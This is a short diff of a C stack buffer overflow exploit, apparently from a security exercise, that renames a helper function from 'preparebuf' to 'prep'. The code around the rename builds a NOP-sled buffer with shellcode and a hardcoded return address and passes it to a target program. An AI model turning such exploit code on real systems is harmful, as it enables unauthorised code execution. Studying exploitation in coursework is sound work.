@@ -11,7 +11,7 @@ const int BSIZE = 408;
 const int SHSIZE = sizeof(shellcode) - 1;
 const uint32_t RET = 0xffffdb2c;
 
-void preparebuf(char *buf) {
+void prep(char *buf) {
     memset(buf, 0x90, BSIZE);
     buf[BSIZE] = '\0';
     memcpy(buf, shellcode, SHSIZE);
@@ -24,7 +24,7 @@ int main(void)
     char *env[1];
     char buf[BSIZE + 1];
 
-    preparebuf(buf);
+    prep(buf);
 
     args[0] = TARGET;
     args[1] = buf;
